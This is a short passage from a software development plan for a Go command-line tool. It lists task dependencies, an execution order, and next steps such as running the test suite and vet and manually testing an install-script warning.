**Dependencies:** Tasks are mostly independent. Task 6 depends on Task 5 (both modify writeJSONFile). All others can be done in any order.

**Recommended execution order:** Follow task numbering (1-12) for logical flow, but tasks 1-7 are higher priority (HIGH/MEDIUM severity).

## Next Steps

After completing Phase 2:
1. Run full test suite: `cd /home/hhewett/.local/src/romanesco/cli && make test`
2. Run vet: `cd /home/hhewett/.local/src/romanesco/cli && make vet`
3. Manual TUI testing for app install.sh warning (Task 8)
4. Proceed to Phase 3 (Color & Accessibility) or Phase 1 (CLI Flags & Error Handling) depending on priorities